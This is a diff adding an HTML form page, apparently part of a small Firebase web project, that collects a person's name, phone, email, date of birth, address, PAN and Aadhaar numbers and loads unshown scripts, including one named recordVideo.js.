@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contact Messages | Firebase</title>
+    <link rel="stylesheet" href="./hi.css">
+    <link rel="stylesheet" href="./style.css">
+    <!-- Link the CSS file -->
+</head>
+
+<body>
+    <div class="container">
+        <form action="" id="contactForm">
+            <div class="alert">Your message sent</div>
+
+            <div class="inputBox">
+                <input type="text" id="name" placeholder="Your name...." />
+            </div>
+            <div class="inputBox">
+                <input type="text" id="Contact No" placeholder="Phone No" />
+            </div>
+
+            <div class="inputBox">
+                <input type="email" id="emailid" placeholder="Your Email....." />
+            </div>
+
+            <div class="inputBox">
+                <input type="date" id="dob" placeholder="Datof Birth">
+            </div>
+
+            <div class="inputBox">
+                <textarea id="msgContent" cols="30" rows="10" placeholder="Address"></textarea>
+            </div>
+
+            <div class="inputBox">
+                <input type="text" id="PAN" placeholder="Pan Card" />
+            </div>
+
+            <div class="inputBox">
+                <input type="text" id="Aadhaar" placeholder="Aadhaar Card" />
+            </div>
+
+            <div class="inputBox">
+                <button type="submit" id="submitBtn">Submit</button>
+                <a href="photo.html" class="next-link">Next</a>
+            </div>
+        </form>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+    <script src="./hi.js"></script>
+    <script src="./recordVideo.js"></script>
+</body>
+
+</html>
